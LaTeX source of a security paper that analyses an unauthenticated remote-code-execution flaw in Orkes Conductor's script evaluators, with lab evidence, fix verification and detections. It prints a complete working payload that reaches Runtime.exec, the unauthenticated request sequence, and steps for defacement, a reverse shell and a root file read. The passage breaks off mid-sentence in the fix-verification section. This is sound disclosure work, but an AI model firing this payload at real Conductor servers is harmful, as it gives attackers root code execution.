% =============================================================================
% CVE-2026-58138: ARL case 005 paper (Xpectra Security Research)
% "CVE-2026-58138: Unauthenticated RCE in Orkes Conductor GraalVM Script
%  Evaluators. Lab Evidence, Fix Verification, and Defender Detections"
% Build: pdflatex main.tex (twice), TEXINPUTS incl. IEEEtran dir.
% Numbers ONLY via claim_gate patterns from claims.json (claim ids in
% comments, long tokens published verbatim inside listings so the raw value
% stays contiguous while TeX wraps it). Stills ship from evidence/stills/
% (see paper/STILLS-OCR.md). Style law: no em/en dashes anywhere, plain
% punctuation, attack vocabulary, retired c-word never in prose.
% =============================================================================
\documentclass[journal]{IEEEtran}
\usepackage[utf8]{inputenc}
\usepackage{graphicx}
\usepackage{booktabs}
\usepackage{xcolor}
\usepackage{float}
\usepackage{listings}
\usepackage{hyperref}
\usepackage{microtype}
\usepackage{subcaption}

\hypersetup{colorlinks=true,linkcolor=blue,citecolor=blue,urlcolor=blue}

\definecolor{codebg}{RGB}{245,247,250}
\definecolor{codekw}{RGB}{0,90,150}
\definecolor{codecm}{RGB}{120,120,120}
\definecolor{codestr}{RGB}{160,40,40}

\lstdefinestyle{shell}{
  language=bash,
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  keywordstyle=\color{codekw}\bfseries,
  commentstyle=\color{codecm},
  stringstyle=\color{codestr},
  frame=single,
  breaklines=true,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false,
  numbers=left,
  numberstyle=\tiny\color{codecm},
  xleftmargin=1.5em, xrightmargin=1em
}
\lstdefinestyle{java}{
  language=Java,
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  keywordstyle=\color{codekw}\bfseries,
  commentstyle=\color{codecm},
  stringstyle=\color{codestr},
  frame=single,
  breaklines=true,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false
}
% generic verbatim style (wire text, JSON, YAML, rules). breakatwhitespace=false
% so a single long token wraps instead of overflowing.
\lstdefinestyle{yargen}{
  language={},
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  frame=single,
  breaklines=true,
  breakatwhitespace=false,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false
}

\lstdefinestyle{facts}{
  language={},
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\scriptsize,
  frame=single,
  breaklines=true,
  breakatwhitespace=false,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false,
  xleftmargin=0.6em, xrightmargin=0.6em
}

\newcommand{\figdir}{../evidence/figures}
\newcommand{\stillsdir}{../evidence/stills}

\begin{document}

\title{CVE-2026-58138: Unauthenticated RCE in Orkes Conductor GraalVM Script
Evaluators. Lab Evidence, Fix Verification, and Defender Detections}

\author{Xpectra Security Research\\[0.5ex]
\small Autonomous Research Lab (ARL), published 2026}

\markboth{CVE-2026-58138: Unauthenticated RCE in Orkes Conductor GraalVM
Script Evaluators}
{Xpectra Security Research \MakeLowercase\expandafter\the\year}

\maketitle

\begin{abstract}
Orkes Conductor 3.21.21 before 3.30.2 contains an unauthenticated remote code
execution (RCE) vulnerability (CVE-2026-58138, CWE-94) in the GraalVM script
evaluators behind the INLINE, LAMBDA, DO\_WHILE, and SWITCH workflow tasks.
VulnCheck published its advisory on 2026-06-30, the CVE Record was last
updated 2026-07-14, and third-party reporting has documented in-the-wild
attempts since 2026-08-21. We did not discover this vulnerability, and we
claim no priority over the public advisory, the CVE Record, or the fix
commits. What the public record does not contain is the rest: a demonstrated
attacker chain documented in captured stills (the live take plus a read-only
victim-console follow-up), an
interactive shell with wire evidence, a non-vacuous A/B verification of the
vendor fix, and a
live-fired detection set. This paper supplies all four, produced in an
isolated zero-egress Docker lab running the stock vendor image with fictional
\texttt{*.lab} naming and no third-party system touched. The pipeline, from
research to rules, was operated by autonomous AI agents under counted gates,
and that pipeline is itself reported as part of the method. The RCE lands as
root inside the victim container. No host escape is claimed or established.
\end{abstract}

\begin{IEEEkeywords}
Cyberattacks, remote code execution, workflow automation, GraalVM, penetration
testing, LLM agents, incident detection, CVE-2026-58138.
\end{IEEEkeywords}

% =============================================================================
\section{Introduction}
\label{sec:intro}

Workflow orchestrators are unusual blast radius. Conductor sits between a
business process definition and the services that execute it, and it evaluates
script expressions written into those definitions at run time. When the
evaluation sandbox trusts the host runtime and the API that accepts the
definition requires no credentials, two anonymous HTTP requests are an RCE.
That is CVE-2026-58138 in the GraalVM-backed evaluators of Orkes Conductor and
the OSS conductor-server lineage.

The disclosure record is public and dated. VulnCheck published its advisory on
2026-06-30
% claim: advisory-date
with critical severity, and GHSA-7x5q-8f6h-rjrc went public the same day
\cite{vulncheck,ghsa}. The CVE Record (updated 2026-07-14) carries the CVSS
3.1 and CVSS 4.0 vectors and the affected range quoted verbatim in
Listing~\ref{lst:baseline},
% claim: cvss-v31 (full value, Listing~\ref{lst:baseline})
% claim: cvss-v40 (full value, Listing~\ref{lst:baseline})
% claim: affected-range (full value, Listing~\ref{lst:baseline})
classifies the flaw as CWE-94
% claim: cwe
\cite{cverecord}. The vendor shipped the fix in two public commits,
\texttt{87a7d96aabbb} (2026-05-05, PR \#1057) and \texttt{c691e35e768c}
(2026-05-22, PR \#1123), the second landing in release 3.30.2
\cite{fixcommits}. Empirical Security reported active exploitation beginning
2026-08-21, Fortinet reported roughly 1,300 blocked attempts on 2026-09-08 and
2026-09-09 with an outbreak alert the following week, and trade press
summarized both on 2026-09-18 \cite{itw}. The CISA KEV catalog did not list
this CVE as of our retrieval on 2026-09-21 (catalog 2026.09.18, zero matches
across the 1716-entry feed, parsed programmatically). One honesty note the
cards themselves cannot express: the CISA SSVC card in the CISA ADP
vulnrichment container of the CVE Record (not the KEV feed) recorded
exploitation \emph{none} even though in-the-wild observation predates it by
weeks \cite{cverecord}. We report the card as published and the reporting as
reported, and we treat active exploitation as a fact from the third-party
reporting rather than from the card.

\begin{table}[t]
\centering
\caption{Disclosure timeline anchors, retrieved 2026-09-21 from the case facts
file (dates quoted from the public record, finder credit included).}
\label{tab:timeline}
\footnotesize
\begin{tabular}{@{}p{2.35cm}p{5.55cm}@{}}
\toprule
Date & Event \\
\midrule
2026-05-05 & fix commit \texttt{87a7d96aabbb} (PR \#1057) \\
2026-05-22 & fix commit \texttt{c691e35e768c} (PR \#1123, ships in 3.30.2) \\
2026-06-30 & VulnCheck advisory and GHSA published \\
2026-07-14 & CVE Record last update \\
2026-08-21 & first reported in-the-wild observation (Empirical) \\
2026-09-08 & Fortinet attempt volume + outbreak alert week \\
2026-09-21 & KEV feed check: not listed \\
\bottomrule
\end{tabular}
\end{table}

The score baseline and the exact build provenance of our two lab arms are
published verbatim in Listing~\ref{lst:baseline}. Every line there is
re-derived from the case artifacts by the claim gate at check time, so no
number in this paper was typed from memory.

\begin{table*}[t]
\centering
\begin{minipage}{0.96\textwidth}
\begin{lstlisting}[style=facts,caption={Gate-derived value baseline: case facts (quoted verbatim from the
case facts file, digests cross-checked against registry digests at lab build
time) and the frozen A/B payload digest (from the A/B evidence file). Claim
ids live in the source comments of this file.},
label={lst:baseline}]
CVSS 3.1   CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 CRITICAL
CVSS 4.0   CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N = 9.3 CRITICAL
Affected   from 3.21.21 before 3.30.2 (CNA VulnCheck, CVE Record verbatim)
CWE        CWE-94
stock arm  conductoross/conductor:3.22.3
sha256:5e0ff45f3f4e15398191d26b36d6c865f96ff765034e255f92af573205695119
patched    conductoross/conductor:3.30.2
sha256:487d6fb3616d78ba2915b0b3531be392da0156bf521d167fdb06b111d075eec9
payload    sha256 39869edd68b12b9580e310e791a7374def7e5af2efc2c9bf230ef82c92057d44
\end{lstlisting}
\end{minipage}
\end{table*}
% claim: digest-stock (value in Listing~\ref{lst:baseline})
% claim: digest-patched (value in Listing~\ref{lst:baseline})

\textbf{No discovery claim.} The finder credit belongs to seqradev per the CVE
Record, the advisory analysis to VulnCheck, and the fix to the upstream
maintainers. This paper exists only after the public record, and it cites it
throughout.

\textbf{Our contributions.} Working in an isolated zero-egress lab against the
stock vendor image, and operating the whole pipeline with autonomous agents
(Section~\ref{sec:ethics}), we provide what the public record leaves open, one
item per gap:
\begin{enumerate}
\item \textbf{The victim-console chain.} No public artifact shows the attack
landing on the victim's own UI. We prove the malicious INLINE task executes on
the victim's own serving stack: the vendor-served SPA defacement is served
from the victim's port, because the same root process owns the served files,
and the console and browser moments are carried by documented stills (the
browser defacement from the live take, the console history view from a
read-only follow-up session; Sections~\ref{sec:exploit}
and~\ref{sec:walkthrough}).
\item \textbf{An interactive out-of-band shell} from the JVM as root, shown
end to end with sealed transcripts and wire captures of the callback
(Section~\ref{sec:exploit}).
\item \textbf{A non-vacuous A/B fix verification} on frozen payload bytes,
stock 3.22.3 versus patched 3.30.2, with witnessed inertness at the sink on
the patched arm and an engine-aliveness control proving the denial is
payload-level rather than a dead evaluator or an auth wall
(Section~\ref{sec:fix}).
\item \textbf{A live-fired detection set} (Suricata, Sigma, YARA) replayed
against our own captures with benign controls that do not fire
(Section~\ref{sec:detection}), including the finding that the successful
exploit is log-silent on 3.22.3.
\item \textbf{A reproducible zero-egress lab pack} with counted gates for
Conductor, from image digest pinning to teardown verification
(Section~\ref{sec:lab}).
\end{enumerate}

Roadmap. Section~\ref{sec:vuln} characterizes the sink and the trust chain.
Section~\ref{sec:lab} is the lab and method. Section~\ref{sec:exploit} is the
exploitation evidence including the step-by-step walkthrough.
Section~\ref{sec:fix} verifies the fix, Section~\ref{sec:detection} the
detections, Section~\ref{sec:remediation} remediation and incident response,
and Section~\ref{sec:ethics} ethics, reproducibility, and the agent pipeline.
Section~\ref{sec:conclusion} concludes.

% =============================================================================
\section{Vulnerability Characterization}
\label{sec:vuln}

\subsection{Stack and sink}

Conductor's INLINE, LAMBDA, DO\_WHILE, and SWITCH tasks evaluate a
caller-supplied expression per task execution. The sink is
\texttt{ScriptEvaluator.java} in conductor-core. On the stock image (v3.22.3,
verified against vendor source at that tag), the context constructor is
Listing~\ref{lst:sink}. \texttt{HostAccess.ALL} lets script code call members
on arbitrary Java objects that reach the context. The evaluator's 4-second
budget (\texttt{DEFAULT\_MAX\_EXECUTION\_SECONDS}) kills blocking expressions,
which shapes the payload but does not prevent execution.

\begin{lstlisting}[style=java,caption={Sink shape at v3.22.3
(\texttt{createNewContext()}, ScriptEvaluator.java lines 116 to 120, vendor
source at the tag).},label={lst:sink}]
private static Context createNewContext() {
  return Context.newBuilder("js")
      .allowHostAccess(HostAccess.ALL)
      .option("engine.WarnInterpreterOnly","false")
      .build();
}
\end{lstlisting}

The input binding is the load-bearing half. The task's
\texttt{inputParameters} map is bound into the script as \texttt{\$}
(\texttt{jsBindings.putMember("\$", input)} at the stock tag). With
\texttt{HostAccess.ALL} the script may call members on that Java object graph,
and from any object it can reach its own \texttt{Class}, and from there static
reflection (Listing~\ref{lst:payload}). The patch changes exactly this hop
(Section~\ref{sec:fix}).

\subsection{Trust chain, hop by hop}

Figure~\ref{fig:chain} traces the chain. Hop 1, the registration
\texttt{POST\allowbreak{} /api/metadata/workflow} accepts a definition with no
authentication on the default build. Hop 2, the start POST schedules the task.
Hop 3, the expression reaches the polyglot context. Hop 4, the context answers
attribute access on \texttt{\$} by reflecting into the JVM. Hop 5, reflection
reaches \texttt{java.lang.Runtime.exec}. Nothing between the wire and the
shell re-checks the assumption that the expression is only a computation.

\begin{figure*}[t]
\centering
\includegraphics[width=0.86\textwidth]{\figdir/fig-attack-chain.png}
\caption{The chain from two unauthenticated POSTs to root inside the victim
container, generated from the case facts by \texttt{paper/make\_figs.py}
(Section~\ref{sec:exploit} for measured latencies). The green box is the
patched arm's divergence point witnessed in Section~\ref{sec:fix}. The
boundary line states what we did \emph{not} establish: the RCE is
container-root, and no host escape was performed.}
\label{fig:chain}
\end{figure*}

\subsection{Preconditions}

Three preconditions, all satisfied by the stock image with default
configuration, no feature flags, and no operator adaptation:
\begin{itemize}
\item The HTTP API is reachable. The OSS monolith ships \texttt{/api/*}
without an authentication layer by default, so reachability of port 8080 is
the only network condition. Within the advisory range that makes this an
internet-facing RCE wherever the default holds.
\item A task type that evaluates an expression. INLINE is used throughout this
paper.
\item A GraalVM context with host access, which is what the affected releases
ship.
\end{itemize}
The CVSS PR:N/UI:N is honest. No credential, no user interaction. Execution
identity is the server process, which on the monolithic image is uid 0 inside
the container (the image carries no \texttt{USER} directive and
\texttt{startup.sh} runs nginx and the JVM as the same uid).

\subsection{Why Nashorn idioms die here}

The sink is GraalJS, not Nashorn, and the difference matters. Four plausible
shapes fail on 3.22.3 (attempt log \#2 to \#5): \texttt{Java.type} (a Nashorn
shim, undefined), bare \texttt{java.lang.X} (same reason), static calls
through host objects (member resolution refuses static members on
\texttt{java.lang.Class} under \texttt{HostAccess.ALL} alone), and
\texttt{\$.getClassLoader()} (the \texttt{\$} binding is a deep-copied
\texttt{HashMap} whose loader is null). The working shape is a reflection
bootstrap that uses instance member access only, detailed in
Section~\ref{sec:exploit}.

% =============================================================================
\section{Lab and Methodology}
\label{sec:lab}

\subsection{Topology and isolation}

Figure~\ref{fig:topo} shows the lab. One Docker bridge,
\texttt{cve58138\_lab} at 172.30.58.0/24, created \texttt{-{}-internal}, so
the bridge has no default route and no DNS path. Two arms, the stock
vulnerable image and the patched arm, both run by image digest so a tag move
cannot silently swap the lab. The attacker is the host itself, attached at the
bridge gateway 172.30.58.1. All naming is fictional \texttt{*.lab}. No
third-party system is contacted at any point, by design rather than by
discipline. The isolation is a network property, and the lab gate script
re-proves it after every session (no DNS resolution, no TCP egress,
\texttt{Internal=true} on the network).
% claim: lab-verify-count
The recorded parent re-run of that gate (\texttt{evidence/lab-gate-parent-rerun.txt})
prints 27 checks, 27 ok / 0 fail.

\begin{figure}[t]
\centering
\includegraphics[width=\columnwidth]{\figdir/fig-topology.png}
\caption{Lab topology. Zero egress is enforced by the \texttt{-{}-internal}
bridge and machine-checked by the counted gate script
\texttt{lab/verify.sh}. Digests are verified against registry
\texttt{RepoDigests} at build time, and build, teardown, and negative demos
ship under \texttt{lab/} in the case pack.}
\label{fig:topo}
\end{figure}

\subsection{Target provenance}

Table~\ref{tab:prov} pins both arms and Listing~\ref{lst:baseline} carries
their full digests.
% claim: lab-verify-gate
The stock arm is the public \texttt{conductoross/conductor:3.22.3} image, a
version inside the advisory range, with the \texttt{HostAccess.ALL} sink shape
confirmed against vendor source at that tag. The patched arm is
\texttt{3.30.2}, the fixed release. Containers are run by digest reference and
the server build identity is confirmed live via \texttt{/actuator/info} on
each arm.

\begin{table}[t]
\centering
\caption{Arm provenance. Container names and IPs are case-bound. Full digests
in Listing~\ref{lst:baseline}.}
\label{tab:prov}
\footnotesize
\begin{tabular}{@{}p{1.45cm}p{3.1cm}p{3.1cm}@{}}
\toprule
Arm & Image (by digest) & Live identity \\
\midrule
stock (S-A) & \texttt{conductoross/\allowbreak conductor:3.22.3} at
172.30.58.20 & \texttt{/actuator/info} build 3.22.3, sink shape at tag \\
patched (S-B) & \texttt{conductoross/\allowbreak conductor:3.30.2} at
172.30.58.30 & \texttt{/actuator/info} build 3.30.2, denial observed \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Integrity controls}

Four controls run through every experiment in this paper, and the numbers in
it come from them rather than from our memory.
\begin{enumerate}
\item \textbf{Counted gates.} Lab state is certified by counted scripts
(\texttt{lab/verify.sh} prints an ok/fail tally and exits non-zero on any
fail). The offline suite for the PoC tool runs 20 counted checks including 18
guard-refusal vectors, and it stays green with the victim container paused,
which proves it needs no network.
\item \textbf{Sealed transcripts.} Every live run writes a transcript sealed
with its own sha256, so quoted output is bound to the run that produced it.
\item \textbf{Structural targeting guard.} The tool refuses any target that is
not a literal IPv4 inside the lab subnet, and it refuses the patched arm and
the gateway as targets. There is no bypass flag, and a test greps the source
for one. The guard fires before any socket call.
\item \textbf{Restore contract.} Every live run ends by removing its proof
marker, byte-restoring the served UI (md5-verified against a backup), and
deleting every workflow definition it registered (verified by a 404 GET).
Completed workflow instances cannot be purged by API on this build (the delete
answers HTTP 409), so instance history survives as inert rows until a lab
rebuild. We state that rather than hiding it.
\end{enumerate}

\subsection{Method and the attempt record}

Payload discovery followed a public idiom (the reflection bootstrap
circulating with the public PoC \cite{publicpoc}), re-derived in our lab
rather than copied, and the invalid attempts are part of the record: 6 logged
attempts, 5 invalid
% claim-requests: attempt-log row count + invalid count (see claims-requests.md)
before the working shape (the two Nashorn-isms of Section~\ref{sec:vuln},
two further Graal-interop failures, and one request-schema error on our
side). The A/B ran same-day with
byte-identical payload expressions on both arms (Section~\ref{sec:fix}), and
detection rules were written only from our own captures
(Section~\ref{sec:detection}). Deviations are listed where they occurred
rather than collected in an appendix.

% =============================================================================
\section{Exploitation Evidence}
\label{sec:exploit}

\subsection{The PoC artifact and its impact ladder}

One stdlib-only Python tool drives everything
(\texttt{exploit/\allowbreak conductor\_cve2026-58138.py}, sha256 head
\texttt{ddb6e32f4a5f59fd},
% claim: tool-sha
case-bound and guard-bound). Its modes form an impact ladder, and each rung
was fired live against the stock arm with a sealed transcript: (1) a proof
marker, a file at \texttt{/tmp/cve2026-58138-}\allowbreak\texttt{canary}
written as root with stdout returned through the API, (2) defacement of the
vendor-served SPA with byte-exact backup and restore, (3) an interactive root
shell back to the attacker listener, and (4) a root fixture read of
\texttt{/root/flag.txt}. The ladder exists so destructive rungs are only ever
demonstrated after the non-destructive one has proven code execution.

\subsection{Payload anatomy}

The minimal payload is one JavaScript expression carried in the INLINE task's
\texttt{expression} field. Listing~\ref{lst:payload} shows the dry-run variant
byte-for-byte as registered. It walks \texttt{\$} to its \texttt{Class},
obtains the \texttt{forName} method handle, loads \texttt{java.lang.Runtime},
builds a \texttt{String[]} reflectively (direct static construction is exactly
what \texttt{HostAccess.ALL} does not grant), and runs the marker command. The
interactive rung adds one wrapper. The 4-second execution budget and dash as
\texttt{/bin/sh} force a detached \texttt{setsid} launch of an interactive
bash whose redirect opens the TCP socket back to the listener (the full
payload literal appears in the sealed transcripts and in the tool's golden
wire dumps).

\begin{lstlisting}[style=yargen,caption={Dry-run payload expression as
registered (single line, wrapped by the listing style). The command writes the
proof marker, echoes \texttt{PROOF-MARKER-WRITTEN}, and cats the file back so
root stdout returns through the API. Same-day A/B used these exact bytes on
both arms (Section~\ref{sec:fix}).},label={lst:payload}]
var k=$.getClass().getClass();var S=k.getMethod('getName').getReturnType();var forName=k.getMethod('forName',S);var L=function(n){return forName.invoke(null,[n]);};var RT=L('java.lang.Runtime');var rt=RT.getMethod('getRuntime').invoke(null,[]);var I=L('java.lang.Integer').getField('TYPE').get(null);var A=L('java.lang.reflect.Array');var arr=A.getMethod('newInstance',k,I).invoke(null,[S,3]);var set=A.getMethod('set',L('java.lang.Object'),I,L('java.lang.Object'));set.invoke(null,[arr,0,'sh']);set.invoke(null,[arr,1,'-c']);set.invoke(null,[arr,2,'id > /tmp/cve2026-58138-canary; hostname >> /tmp/cve2026-58138-canary; chmod 0644 /tmp/cve2026-58138-canary; echo cve2026-58138-marker >> /tmp/cve2026-58138-canary; echo PROOF-MARKER-WRITTEN; ls -l /tmp/cve2026-58138-canary; cat /tmp/cve2026-58138-canary']);var p=RT.getMethod('exec',arr.getClass()).invoke(rt,[arr]);p.waitFor();var isr=L('java.io.InputStreamReader').getConstructor(L('java.io.InputStream')).newInstance(p.getInputStream());var br=L('java.io.BufferedReader').getConstructor(L('java.io.Reader')).newInstance(isr);var o='',l;while((l=br.readLine())!==null)o+=l+'\n';o
\end{lstlisting}

\subsection{Wire shape}

Listing~\ref{lst:wire} condenses the A/B positive-control exchange on the
stock arm, the one run whose stdout is seal-bound to the sealed dry-run
transcript. Two POSTs, one GET, root stdout. Across the 18 recorded runs of
the live latency log, register stayed at or under 9.8 ms and sink execution
ran 18.7 to 48.5 ms, so the whole trigger is a sub-second event on an idle
container.

\begin{lstlisting}[style=yargen,caption={Condensed wire exchange from
\texttt{evidence/fix-verification/}\allowbreak\texttt{run-stock/}\allowbreak\texttt{positive-control-run.txt}
(stdout seal-bound to the sealed dry-run transcript; polling trimmed, values
verbatim). The register
POST answers 200, the start POST returns a workflow id, and the task's
\texttt{outputData.result} carries the root command's stdout back to the
anonymous caller.},label={lst:wire}]
POST /api/metadata/workflow HTTP/1.1        (unauthenticated)
  {"name":"cve2026-58138-poc", ..., "tasks":[{"type":"INLINE",
   "inputParameters":{"evaluatorType":"javascript",
   "expression":"var k=$.getClass().getClass(); ..."}}], "version":36}
< HTTP/1.1 200 OK                             [register, 2-5 ms]

POST /api/workflow/cve2026-58138-poc?version=36 HTTP/1.1
  {}
< HTTP/1.1 200 OK                             [workflow id issued]

GET /api/workflow/3197eaf5-a807-4bb0-94f4-46f2edaa8bd1?includeTasks=true
  task[0] status=COMPLETED  outputData.result:
    PROOF-MARKER-WRITTEN
    -rw-r--r-- 1 root root 80 Sep 21 18:04 /tmp/cve2026-58138-canary
    uid=0(root) gid=0(root) groups=0(root)
    cve2026-58138-stock
    cve2026-58138-marker
\end{lstlisting}

\subsection{Attack walkthrough}
\label{sec:walkthrough}

The numbered steps below are the camera script the evidence takes executed
(wave W5, captured; the victim-console view of step 4 comes from a follow-up
read-only browsing session of the inert instance history, see
Figure~\ref{fig:still3}). Each step names the exact terminal moment, and
\texttt{paper/STILLS-REQUEST.md} fixed the needle text, viewport, and
evidence transcript each take re-creates; \texttt{paper/STILLS-OCR.md}
records the placement OCR of every shipped frame. Stills ship as raw frames,
and captions live in this source file only, never baked into pixels.

\begin{enumerate}
\item \textbf{Registration.} The attacker registers the PoC workflow with one
unauthenticated POST. On screen: the tool's register line with the bumped
version and its millisecond timing.
\item \textbf{Trigger.} The start POST returns a workflow id, and the task
runs within milliseconds.
\item \textbf{Code execution, non-destructive rung.} On screen: the grep
re-home block of the run output prints \texttt{PROOF-MARKER-WRITTEN}, the
root identity line \texttt{uid=0(root) gid=0(root) groups=0(root)}, and the
\texttt{READBACK} marker echo. The marker's \texttt{ls -l} line lands in the
sealed transcript, not in a take frame of this re-shoot.
\item \textbf{Victim console.} On the victim UI, the malicious INLINE task
renders COMPLETED with its output, in the same console the operators use
(Figures~\ref{fig:still3} and~\ref{fig:still3b}, read-only follow-up
capture).
\item \textbf{Defacement.} On camera, the root shell backs up the served
page with \texttt{cp} and \texttt{md5sum}, then injects four
\texttt{\textless br\textgreater{}} breaks and an
\texttt{\textless h1\textgreater Pwend by Xpectra
Agent!\textless /h1\textgreater{}} banner at the single
\texttt{\textless body\textgreater{}} anchor of the served
\texttt{index.html} with one \texttt{sed -i} edit, so the SPA console keeps
running under the banner. The typed \texttt{sed -i} edit and the
\texttt{grep} readback of the served file, with the literal on its own
output line, both carry on camera. The sealed tool transcript of the same
rung serves 371 bytes on a GET against the victim's port 5000, and the
post-take rig restore returns the served file to the factory md5.
\item \textbf{Interactive root shell.} On screen: the relay banner
\texttt{bash: no job control in this shell}, the prompt
\texttt{root@cve2026-58138-}\allowbreak\texttt{stock:/app/libs\#},
\texttt{id} returning \texttt{uid=0(root)}.
\item \textbf{Fixture read.} The shell reads \texttt{/root/flag.txt} as root,
closing the chain on a confidentiality target rather than a marker.
\end{enumerate}

\begin{figure}[t]
\centering
\includegraphics[width=\columnwidth]{\stillsdir/still-1-registration.png}
\caption{STILL-1, from the sealed take \texttt{take-005-main.mov} at video
t\,=\,78.33\,s (frame 2350): the tool's register line
\texttt{cve2026-58138-poc v139 registered (2 ms)} above the \texttt{[exec]}
completion line carrying the workflow id of the dry run; the victim-console
history view of such runs is Figure~\ref{fig:still3} (read-only follow-up).
Placement OCR in \texttt{paper/STILLS-OCR.md}.}
\label{fig:still1}
\end{figure}

\begin{figure}[t]
\centering
\includegraphics[width=\columnwidth]{\stillsdir/still-2-proof-marker.png}
\caption{STILL-2, same take at video t\,=\,81.33\,s (frame 2440): the grep
re-home echo of the dry-run output carrying
\texttt{PROOF-MARKER-WRITTEN}, the root identity line
\texttt{uid=0(root) gid=0(root) groups=0(root)}, and the \texttt{READBACK}
marker echo (all three lines read at 1x OCR, per \texttt{STILLS-OCR.md}; the
marker's \texttt{ls -l} line is in the sealed transcript, not in this take
frame).}
\label{fig:still2}
\end{figure}

\begin{figure*}[t]
\centering
\includegraphics[width=0.98\textwidth]{\stillsdir/still-3-victim-console.png}
\caption{STILL-3, from the read-only follow-up capture
\texttt{w6d-still3c.mov} (frame 1320) in the victim browser at
\texttt{172.30.58.20:5000}: the execution view of instance
\texttt{71863d4b-ed28-4d5d-a649-a307bb769f88} renders the workflow name
\texttt{cve2026-58138-poc} with the green \texttt{COMPLETED} chip, and the
Workflow Input/Output tab shows
\texttt{"result": "PROOF-MARKER-WRITTEN\textbackslash n-rw-r--r--}\ldots\ in
the read-only editor. No state change: pure GET browsing of inert SQLite
history.}
\label{fig:still3}
\end{figure*}

\begin{figure*}[t]
\centering
\includegraphics[width=0.98\textwidth]{\stillsdir/still-3b-victim-executions-list.png}
\caption{STILL-3b, same follow-up capture, executions list filtered to
\texttt{cve2026-58138-poc}: five instance rows (start/end times, workflow
ids) each with the status cell reading \texttt{COMPLETED}, and the
pagination line \texttt{1-15 of 85}. The full inert history the operators
see.}
\label{fig:still3b}
\end{figure*}

\begin{figure}[t]
\centering
\includegraphics[width=\columnwidth]{\stillsdir/still-4-deface-served.png}
\caption{STILL-4, same take at video t\,=\,124.00\,s (frame 3720): the root
shell typing the one-line \texttt{sed -i} injection of the
\texttt{\textless h1\textgreater} banner into \texttt{index.html}, then the
\texttt{grep} readback of the served file with the injected literal
\texttt{Pwend by Xpectra Agent!} on its own output line. The pre-deface curl
of port 5000 left the camera script with the R3 arc change; this frame is the
on-camera readback of the same fact.}
\label{fig:still4}
\end{figure}

\begin{figure}[t]
\centering
\includegraphics[width=\columnwidth]{\stillsdir/still-5-defaced-page.png}
\caption{STILL-5, same take at video t\,=\,146.67\,s (frame 4328): the
victim browser on \texttt{172.30.58.20:5000} showing the defaced page with
the \texttt{Pwend by Xpectra Agent!} headline over the still-rendered vendor
header, after a cache-bypassing re-navigation.}
\label{fig:still5}
\end{figure}

\begin{figure}[t]
\centering
\includegraphics[width=\columnwidth]{\stillsdir/still-6-root-shell.png}
\caption{STILL-6, same take at video t\,=\,106.67\,s (frame 3200): the
relay banner \texttt{bash: no job control in this shell}, the prompt
\texttt{root@cve2026-58138-stock:/app/libs\#}, and \texttt{id} printing
\texttt{uid=0(root)}.}
\label{fig:still6}
\end{figure}

\begin{figure}[t]
\centering
\includegraphics[width=\columnwidth]{\stillsdir/still-7-flag-read.png}
\caption{STILL-7, same take at video t\,=\,206.43\,s (frame 6050, 15 frames
before the cut): the root shell reading \texttt{/root/flag.txt}, with the
fixture contents returned.}
\label{fig:still7}
\end{figure}

\subsection{Shell and process evidence}
\label{sec:shellevid}

The reverse-shell rung connected \texttt{172.30.58.20:59250} to the attacker
listener \texttt{172.30.58.1:4444} (sealed transcript
\texttt{reverse-shell-20260921T180715Z}, seal sha256 head
\texttt{9122fed1422b9910}). The wire capture shows the SYN, the banner bytes,
and the \texttt{uid=0(} echo on the callback channel, which is what the
Suricata egress rules fire on (Section~\ref{sec:detection}). Process evidence
is honest about its limits. The container image has no \texttt{ps}, so process
claims use a \texttt{/proc} command-line walk. The walk on the patched arm
(negative, Section~\ref{sec:fix}) shows the baseline tree (pid 1
\texttt{startup.sh}, nginx master and workers, the JVM, \texttt{tee}) with no
spawned shell. On the stock arm we demonstrate the shell's identity through
the interactive session and the callback bytes, and we do not claim a
stock-arm process snapshot that we did not freeze at the moment of connection.

% =============================================================================
\section{Fix Verification}
\label{sec:fix}

\subsection{What the patch changes}

Release 3.30.2 rewrites the context construction (Listing~\ref{lst:fixed}), a
\texttt{denyAccess} blocklist (Class, ClassLoader, reflection
Method/Field/Constructor/Array, Runtime, ProcessBuilder, Process, System,
Thread, ThreadGroup) plus \texttt{allowHostClassLoading(false)},
\texttt{allowNativeAccess(false)}, \texttt{allowCreateThread(false)},
\texttt{allowCreateProcess(false)}, \texttt{allowIO(IOAccess.NONE)}, and a
shared engine with \texttt{js.load} disabled. The bootstrap of
Listing~\ref{lst:payload} begins by resolving an instance member on a
\texttt{java.lang.Class}, which the blocklist removes from the member
namespace. The fix is structural, the reflection path becomes unreachable,
rather than a signature blacklist.

\begin{lstlisting}[style=java,float=t,caption={Fixed \texttt{createNewContext()} shape
at v3.30.2 (vendor source at the tag, condensed to the security-relevant
lines).},label={lst:fixed}]
HostAccess hostAccess =
    HostAccess.newBuilder(HostAccess.ALL)
        .denyAccess(Class.class)
        .denyAccess(ClassLoader.class)
        .denyAccess(java.lang.reflect.Method.class)
        .denyAccess(java.lang.reflect.Field.class)
        .denyAccess(java.lang.reflect.Constructor.class)
        .denyAccess(java.lang.reflect.Array.class)
        .denyAccess(Runtime.class)
        .denyAccess(ProcessBuilder.class)
        .denyAccess(Process.class)
        .denyAccess(System.class)
        .denyAccess(Thread.class)
        .denyAccess(ThreadGroup.class)
        .build();
return Context.newBuilder("js")
    .engine(ENGINE).allowHostAccess(hostAccess)
    .allowHostClassLoading(false).allowNativeAccess(false)
    .allowCreateThread(false).allowCreateProcess(false)
    .allowIO(IOAccess.NONE) /* ... */ .build();
\end{lstlisting}

\subsection{A/B on frozen bytes}

The A/B question is not whether 3.30.2 looks safer. It is whether the
identical payload bytes that execute on 3.22.3 demonstrably fail to execute on
3.30.2, on the same day, through the same code path, for a payload-bound
reason. Both arms received the byte-identical expression of
Listing~\ref{lst:payload}, whose sha256 is asserted per send (frozen payload
digest in Listing~\ref{lst:baseline}). Register bodies differed only in the
